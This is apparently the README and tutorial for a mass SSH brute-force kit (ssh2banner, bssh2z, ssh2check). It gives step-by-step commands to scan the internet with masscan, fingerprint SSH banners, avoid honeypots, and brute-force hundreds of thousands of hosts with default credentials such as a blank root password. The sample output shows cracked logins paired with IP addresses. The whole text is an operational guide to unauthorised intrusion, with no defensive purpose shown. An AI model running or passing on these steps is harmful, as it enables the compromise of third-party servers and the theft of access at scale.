INFO:
INFO.TXT
1. ssh2banner is for retriving the banner of the ssh server. The good thing is that you don't even need u/p, thus making this a very good tool of determining if is a proper ssh server
        INPUT FILE = `i`
        1.2.3.4
        3.3.3.3
        4.4.4.4

        OUTPUT
        1.2.3.4:22:SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu
        3.3.3.3:22:SSH-2.0-OpenSSH_3.7.1p2
        4.4.4.4:22:SSH-WHATEVER_BANNER

        EXAMPLE RUN
        ./ssh2banner <FORKS> <PORT> <TIMEOUT> <VIPCODE>

2. bssh2z (brute ssh) is for brute-forcing list of ips with various passwords
        INPUT FILE (list of ips) = `i`
        1.2.3.4
        3.3.3.3
        4.4.4.4

        INPUT FILE (list of user/pass combo) = `p`
        root $BLANKPASS
        admin admin
        user pass

        OUTPUT
        `n` -> nobash,busybox,honeypot,other linux
        root:r0ot:1.2.3.4:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51
        root:r0ot:4.4.4.4:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51
        root:r0ot:5.5.5.5:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51
        root:r0ot:6.6.6.6:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.5

        `v` -> vuln,virtual,good linux
        root::7.7.7.7:22:Linux:SSH-2.0-OpenSSH_6.6:Intel(R) Xeon(R) CPU E5-2670 v2 @ 2.50GHz:3764 2558 1206 0 166 336:vuln
        user:live:8.8.8.8:22:Linux:SSH-2.0-OpenSSH_6.0p1 Debian-4:Intel(R) Core(TM) i5 CPU 760 @ 2.80GHz:6040 1307 4732 0 135 633:vuln
        root::9.9.9.9:22:Linux:SSH-2.0-OpenSSH_7.1:Intel(R) Atom(TM) CPU C2758 @ 2.41GHz:16038 15859 179 0 0 14317:vuln
        root::10.10.10.10:22:Linux:SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u2:ARMv7 Processor rev 2 (v7l):492 281 210 12 47 109:vuln
        root::11.11.11.11:22:Linux:SSH-2.0-OpenSSH_7.1:Intel(R) Atom(TM) CPU C2758 @ 2.41GHz:16038 15859 178 0 0 14317:vuln

        EXAMPLE RUN
        ./bssh2z <FORKS> <PORT> <TIMEOUT> <VIPCODE>

        If you put like 20 ips and 400 passwords and the scan works slow, don't worry, it is a fail2ban protection. It is pointless to finish them in 1 minute, thus you will get banned after the first 5 tries in less then a minute. It will finish it, have patience.


3. ssh2check (checker ssh) is for re-check your already N or V file from bssh2z to know what servers are still online
        INPUT FILE (list of ips) = `list.txt`
        root:r0ot:1.2.3.4:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51
        root:r0ot:4.4.4.4:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51
        root::7.7.7.7:22:Linux:SSH-2.0-OpenSSH_6.6:Intel(R) Xeon(R) CPU E5-2670 v2 @ 2.50GHz:3764 2558 1206 0 166 336:vuln
        user:live:8.8.8.8:22:Linux:SSH-2.0-OpenSSH_6.0p1 Debian-4:Intel(R) Core(TM) i5 CPU 760 @ 2.80GHz:6040 1307 4732 0 135 633:vuln
        root::9.9.9.9:22:Linux:SSH-2.0-OpenSSH_7.1:Intel(R) Atom(TM) CPU C2758 @ 2.41GHz:16038 15859 179 0 0 14317:vuln
        root:r0ot:5.5.5.5:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51
        root:r0ot:6.6.6.6:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51
        root::10.10.10.10:22:Linux:SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u2:ARMv7 Processor rev 2 (v7l):492 281 210 12 47 109:vuln
        root::11.11.11.11:22:Linux:SSH-2.0-OpenSSH_7.1:Intel(R) Atom(TM) CPU C2758 @ 2.41GHz:16038 15859 178 0 0 14317:vuln


        OUTPUT
        `others.txt` -> nobash,busybox,honeypot,other linux
        root:r0ot:1.2.3.4:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51
        root:r0ot:4.4.4.4:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51
        root:r0ot:5.5.5.5:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51
        root:r0ot:6.6.6.6:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.5

        `servers.txt` -> vuln,virtual,good linux
        root::7.7.7.7:22:Linux:SSH-2.0-OpenSSH_6.6:Intel(R) Xeon(R) CPU E5-2670 v2 @ 2.50GHz:3764 2558 1206 0 166 336:vuln
        user:live:8.8.8.8:22:Linux:SSH-2.0-OpenSSH_6.0p1 Debian-4:Intel(R) Core(TM) i5 CPU 760 @ 2.80GHz:6040 1307 4732 0 135 633:vuln
        root::9.9.9.9:22:Linux:SSH-2.0-OpenSSH_7.1:Intel(R) Atom(TM) CPU C2758 @ 2.41GHz:16038 15859 179 0 0 14317:vuln
        root::10.10.10.10:22:Linux:SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u2:ARMv7 Processor rev 2 (v7l):492 281 210 12 47 109:vuln
        root::11.11.11.11:22:Linux:SSH-2.0-OpenSSH_7.1:Intel(R) Atom(TM) CPU C2758 @ 2.41GHz:16038 15859 178 0 0 14317:vuln

        EXAMPLE RUN
        ./ssh2check <FORKS> <PORT> <TIMEOUT> <VIPCODE>

TUTORIAL:
This is a tutorial that will learn you to efficiently scan SSH servers real fast.

#HoneyPot banners     -> SSH-2.0-Twisted and more
#Honeypot Ram or CPU  -> Ram: "7880 7690 189 0 400 5171" ; CPU: "Intel(R) Core(TM)2 Duo CPU E8200 @ 2.66GHz", some  "QEMU Virtual CPU version 1.7.0" but not all
#Good servers banners -> "SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1.2", "SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u6", "SSH-2.0-OpenSSH_6.6.1" and more, all OpenSSH its posible good
#Nobash banners       -> "SSH-2.0-dropbear", "SSH-2.0-IPSSH-1.10.0", "SSH-2.0-XXXX", "SSH-2.0-Parks", "SSH-2.0-ROSSSH", "SSH-1.99-Cisco-1.25" and more
#Shitty banners       -> "SSH-2.0-RomSShell_4.62", "SSH-1.99-cryptlib", "", and more
#Info: Only for uid0
########################################

password=unlimited
port=22
timeout=15
threads=500
ssSpeed=10
masscan_speed=20000

#########################################

rm -rf input.txt bios.txt i

./masscan $1 -p22 -oL input.txt --max-rate $masscan_speed --open --banners --exclude 255.255.255.255 --exclude 10.0.0.0/8 --exclude 192.168.0.0/16 --exclude 127.0.0.0/8  -sS -Pn -n --randomize-hosts -v --send-eth
./ss $port -a $1 -s $ssSpeed

So we have the bios.txt that containts a list of ips that have port 22 opened it is time to put it to the check with ssh2banner.

(banner ssh will read `i` file, also shuffeling ips)
        cat bios.txt | sort -u | shuf > i
        ./ssh2banner 150 22 10 YOUR_VIPCODE_PASSWORD;

We will use 150 forks (max ssh connection at a time), but you can put whatever number you want(500,1000), be carefull to not get your server banned or in ram/cpu load.

The ssh2banner is way faster then the bssh2z (brute-ssh) because it is just connecting to the server and getting the ssh-banner only without username/passowrd. It will generate an `banners.log` file that will contain data like this :
        1.2.3.4:22:SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu
        3.3.3.3:22:SSH-2.0-OpenSSH_3.7.1p2
        4.4.4.4:22:SSH-WHATEVER_BANNER

You will see a lot of banners, starting from OpenSSH to dropbear or some that you even heared about, like routers and other stuff. This list is perfect to do a brute-SSH attack on it, thus you are 100% that those are servers and not some other applications that are opened on port 22.

Retrieve just the ips from this list with this command :

        rm i;
        cat banners.log | cut -f ":" -f 1 > i;

        if you wish you can scan only dropbear
        cat banners.log | grep "dropbear" | cut -f ":" -f 1 > i;

        or cisco routers
        cat banners.log | grep "cisco" | cut -f ":" -f 1 > i;

Create a nice password file `p` begining with the user/pass combo "root $BLANKPASS", should look like this :
        root $BLANKPASS
        admin admin
        username password
        ...

then do a
        wc -l i p
         233214 i
                 18 p
         233232 total
        Looks ok

Now we will do a brute-SSH attack on those using this command
        ./bssh2z 150 22 10 YOUR_VIPCODE_PASSWORD;

You will see something like this going on:

        Current version : 2.5.1
        Last version : 2.4.1
        Counting PASS
        Counted [18] PASS
        Counting IPS
        Counted [233214] IPS
        There are [4197852] possible combinations
        Starting session 0
        Trying user/pass combo #1->[guest][]
        Combo [9 of 4197852] -> [178.27.29.115] with [guest][]
        Combo [4 of 4197852] -> [220.128.68.129] with [guest][]
        ...

        Duplicate NOBASH [128.54.202.72]
        Duplicate NOBASH [37.48.86.100]
        Combo [53262 of 4197852] -> [67.221.173.53] with [guest][]
        ....



You will see the checking process begin and from time to time check your `n`(non-bash servers) and `v`(good/vuln servers) files, should look like this :

        N
        root:r0ot:1.2.3.4:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51
        root:r0ot:4.4.4.4:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51
        root:r0ot:5.5.5.5:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51
        root:r0ot:6.6.6.6:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51

        V
        root::7.7.7.7:22:Linux:SSH-2.0-OpenSSH_6.6:Intel(R) Xeon(R) CPU E5-2670 v2 @ 2.50GHz:3764 2558 1206 0 166 336:vuln
        user:live:8.8.8.8:22:Linux:SSH-2.0-OpenSSH_6.0p1 Debian-4:Intel(R) Core(TM) i5 CPU 760 @ 2.80GHz:6040 1307 4732 0 135 633:vuln
        root::9.9.9.9:22:Linux:SSH-2.0-OpenSSH_7.1:Intel(R) Atom(TM) CPU C2758 @ 2.41GHz:16038 15859 179 0 0 14317:vuln

        root::10.10.10.10:22:Linux:SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u2:ARMv7 Processor rev 2 (v7l):492 281 210 12 47 109:vuln
        root::11.11.11.11:22:Linux:SSH-2.0-OpenSSH_7.1:Intel(R) Atom(TM) CPU C2758 @ 2.41GHz:16038 15859 178 0 0 14317:vuln

And there you go. More than that, from time to time you can recheck them to see what servers are still online with ssh2check (checker-ssh)

        cat n v > list.txt;
        ./ssh2check 150 22 10 YOUR_VIPCODE_PASSWORD;

        it will output 2 files
        `others.txt` -> nobash,busybox,honeypot,other linux
        root:r0ot:1.2.3.4:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51
        root:r0ot:4.4.4.4:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51
        root:r0ot:5.5.5.5:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.51
        root:r0ot:6.6.6.6:22:UNKNOWN_SYSTEM:SSH-2.0-dropbear_0.5

        `servers.txt` -> vuln,virtual,good linux
        root::7.7.7.7:22:Linux:SSH-2.0-OpenSSH_6.6:Intel(R) Xeon(R) CPU E5-2670 v2 @ 2.50GHz:3764 2558 1206 0 166 336:vuln
        user:live:8.8.8.8:22:Linux:SSH-2.0-OpenSSH_6.0p1 Debian-4:Intel(R) Core(TM) i5 CPU 760 @ 2.80GHz:6040 1307 4732 0 135 633:vuln
        root::9.9.9.9:22:Linux:SSH-2.0-OpenSSH_7.1:Intel(R) Atom(TM) CPU C2758 @ 2.41GHz:16038 15859 179 0 0 14317:vuln
        root::10.10.10.10:22:Linux:SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u2:ARMv7 Processor rev 2 (v7l):492 281 210 12 47 109:vuln
        root::11.11.11.11:22:Linux:SSH-2.0-OpenSSH_7.1:Intel(R) Atom(TM) CPU C2758 @ 2.41GHz:16038 15859 178 0 0 14317:vuln

Happy scanning.

